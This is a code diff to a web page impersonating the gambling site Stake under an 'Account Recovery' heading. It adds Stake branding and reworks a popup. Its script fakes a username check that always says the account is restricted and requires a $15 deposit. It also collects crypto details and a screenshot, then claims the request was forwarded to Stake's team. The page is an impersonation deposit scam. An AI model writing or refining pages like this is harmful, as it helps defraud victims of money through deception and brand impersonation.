@@ -8,7 +8,7 @@
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background-color: #0f0f0f;
+      background-color: #2f4553; /* Stake-style dark */
       color: #fff;
       display: flex;
       justify-content: center;
@@ -41,7 +41,7 @@
       font-size: 1rem;
     }
     button {
-      background-color: #4caf50;
+      background-color: #00e701; /* Stake green */
       color: white;
       cursor: pointer;
     }
@@ -58,34 +58,50 @@
       font-size: 0.9rem;
       color: #00ff9d;
     }
-    #popup {
+    #popup-wrapper {
       position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    #popup {
       background-color: #1e1e1e;
       color: #fff;
       padding: 20px;
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.3);
-      z-index: 9999;
       text-align: center;
-      display: none;
+      z-index: 10000;
     }
     #popup button {
       margin-top: 10px;
       padding: 10px 20px;
-      background-color: #4caf50;
+      background-color: #00e701;
+      color: white;
     }
     .blur {
       filter: blur(5px);
       pointer-events: none;
       user-select: none;
     }
+    .heading {
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #00e701;
+    }
   </style>
 </head>
 <body>
   <div id="main-content" class="container">
+    <div class="heading">Account Recovery</div>
+
     <div class="form-group">
       <label for="username">Username</label>
       <input type="text" id="username" placeholder="Enter Stake Username" />
@@ -132,9 +148,11 @@
     <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
   </div>
 
-  <div id="popup">
-    <p>Your account recovery request has been received by Stake Pass. Your Stake account will be fully active within 24 - 72 hours.</p>
-    <button onclick="closePopup()">OK</button>
+  <div id="popup-wrapper">
+    <div id="popup">
+      <p>Your account recovery request has been received, we forward your request to main stake team . Your Stake account will be fully active within 24 - 72 hours.</p>
+      <button onclick="closePopup()">OK</button>
+    </div>
   </div>
 
   <script>
@@ -156,10 +174,10 @@
     };
 
     function verifyUsername() {
-      document.getElementById('verify-msg').innerHTML = 'Verifying...';
+      const msg = document.getElementById('verify-msg');
+      msg.innerHTML = 'Verifying...';
       setTimeout(() => {
-        document.getElementById('verify-msg').innerHTML =
-          'Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.';
+        msg.innerHTML = 'Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.';
       }, 1500);
     }
 
@@ -193,11 +211,7 @@
       const screenshot = document.getElementById('screenshot').files.length;
 
       const btn = document.getElementById('submitBtn');
-      if (username && coin && network && address && amount && screenshot) {
-        btn.disabled = false;
-      } else {
-        btn.disabled = true;
-      }
+      btn.disabled = !(username && coin && network && address && amount && screenshot);
     }
 
     document.querySelectorAll('input, select').forEach(input => {
@@ -206,7 +220,7 @@
 
     function submitForm() {
       document.getElementById('main-content').classList.add('blur');
-      document.getElementById('popup').style.display = 'block';
+      document.getElementById('popup-wrapper').style.display = 'flex';
     }
 
     function closePopup() {
